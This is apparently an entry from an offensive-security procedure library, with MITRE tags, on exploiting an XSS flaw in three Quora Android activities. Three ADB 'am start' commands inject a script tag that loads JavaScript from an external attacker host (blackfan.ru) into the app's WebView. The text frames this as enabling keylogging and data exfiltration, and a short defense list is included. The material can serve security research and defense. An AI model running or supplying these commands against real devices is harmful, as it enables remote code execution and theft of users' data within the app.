---
tags:
  - xss
  - android
  - remote-script
type: procedure
tools:
  - '[[tools/ADB]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/am-start-actionbar-external-script]]'
  - '[[commands/am-start-content-external-script]]'
  - '[[commands/am-start-modal-external-script]]'
platforms:
  - Android
techniques:
  - '[[JavaScript]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 88ac621e-89c4-4dcf-8e41-7fe08a9ba465
created_at: '2025-12-13T23:52:44.069Z'
updated_at: '2025-12-13T23:52:44.069Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Launch-Multiple-Quora-Activities-with-External-Script-Source

## Summary

This procedure exploits XSS across three Quora Android activities by launching them via ADB with HTML payloads sourcing external JavaScript, allowing remote code execution from an attacker-controlled server.

## Description

By targeting ActionBarContentActivity, ContentActivity, and ModalContentActivity with '<script src=//blackfan.ru></script>', the unsanitized 'html' extra loads remote scripts into the WebView. This enables persistent attacks like keylogging or exfiltration. Requires ADB access; outcomes include network requests to the attacker's domain and script effects within the app.

## Requirements

1. ADB-connected Android device with vulnerable Quora app
2. Attacker-controlled server hosting malicious JS (e.g., at blackfan.ru)
3. Device shell access for 'am start' commands

## Defense

Defensive measures and detection strategies:

- Implement WebView content security policies (CSP) to block external scripts
- Validate and whitelist intent extras in activity onCreate
- Log and alert on unexpected external resource loads in WebView (via shouldOverrideUrlLoading)

## Objectives

1. Load and execute remote JS in multiple app contexts
2. Verify cross-activity exploitation
3. Enable advanced payloads like data beacons

## Instructions

### Step 1: Launch ActionBarContentActivity with External Script

**Context**: Inject payload to fetch and run remote JS in the first activity.

**Command** ([[commands/am-start-actionbar-external-script]]):
```bash
am start -n com.quora.android/com.quora.android.ActionBarContentActivity -e url 'http://test/test' -e html '<script src=//blackfan.ru></script>'
```

> Expected output: Activity launches, script loads from blackfan.ru, and any JS effects (e.g., logs) occur.

### Step 2: Launch ContentActivity with External Script

**Context**: Repeat for ContentActivity to confirm broad vulnerability.

**Command** ([[commands/am-start-content-external-script]]):
```bash
am start -n com.quora.android/com.quora.android.ContentActivity -e url 'http://test/test' -e html '<script src=//blackfan.ru></script>'
```

> Expected output: Similar to Step 1, with script execution.

### Step 3: Launch ModalContentActivity with External Script

**Context**: Target the modal variant for UI-specific exploitation.

**Command** ([[commands/am-start-modal-external-script]]):
```bash
am start -n com.quora.android/com.quora.android.ModalContentActivity -e url 'http://test/test' -e html '<script src=//blackfan.ru></script>'
```

> Expected output: Modal opens with remote script running.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/am-start-actionbar-external-script]]
- [[commands/am-start-content-external-script]]
- [[commands/am-start-modal-external-script]]

## Tools Used

- [[tools/ADB]]

## Tags

- xss
- remote-script
- android
